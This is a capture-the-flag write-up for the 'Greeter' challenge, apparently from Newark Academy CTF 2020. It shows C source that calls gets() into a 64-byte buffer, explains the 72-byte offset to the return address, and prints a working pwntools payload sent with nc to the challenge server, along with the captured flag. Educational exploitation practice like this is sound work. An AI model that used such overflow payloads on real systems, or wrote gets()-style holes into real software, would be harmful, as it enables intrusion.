# Greeter

## Task

File: greeter, greeter.c

## Solution

```c  
#include <stdio.h>  
#include <stdlib.h>

void win() {  
	puts("congrats! here's your flag:");  
	char flagbuf[64];  
	FILE* f = fopen("./flag.txt", "r");  
	if (f == NULL) {  
		puts("flag file not found!");  
		exit(1);  
	}  
	fgets(flagbuf, 64, f);  
	fputs(flagbuf, stdout);  
	fclose(f);  
}

int main() {  
	/* disable stream buffering */  
	setvbuf(stdin,  NULL, _IONBF, 0);  
	setvbuf(stdout, NULL, _IONBF, 0);  
	setvbuf(stderr, NULL, _IONBF, 0);

	char name[64];

	puts("What's your name?");  
	gets(name);  
	printf("Why hello there %s!\n", name);

	return 0;  
}  
```

We have a buffer of 64 bytes. So we need to overwrite 64 + 8 (the rbp) to
reach the rsp, then we can add the address of the win function to call it.

The actual offset (8) can be determined by using a pattern long enough to
definitely reach it. You will get a SIGSEGV with the chars that overflowed the
rsp and can then find the offset.

The address of the win function can be found using `info functions win`. There
are lots of easy to find and understand resources about basic buffer
overflows.

```  
gdb-peda$ checksec  
CANARY    : disabled  
FORTIFY   : disabled  
NX        : ENABLED  
PIE       : disabled  
RELRO     : FULL  
gdb-peda$ r < <(python2 -c 'from pwn import p64;print("A"*72 +
p64(0x401220))')  
Starting program: greeter < <(python2 -c 'from pwn import p64;print("A"*72 +
p64(0x401220))')  
What's your name?  
Why hello there
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA @!  
congrats! here's your flag:  
flag file not found!  
```

```bash  
$ python2 -c 'from pwn import p64;print("A"*72 + p64(0x401220))' | nc challenges.ctfd.io 30249  
What's your name?  
Why hello there
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA @!  
congrats! here's your flag:  
nactf{n4v4r_us3_g3ts_5vlrDKJufaUOd8Ur}  
```  

Original writeup (https://github.com/klassiker/ctf-
writeups/blob/master/2020/newark-academy/binary-exploitation/greeter.md).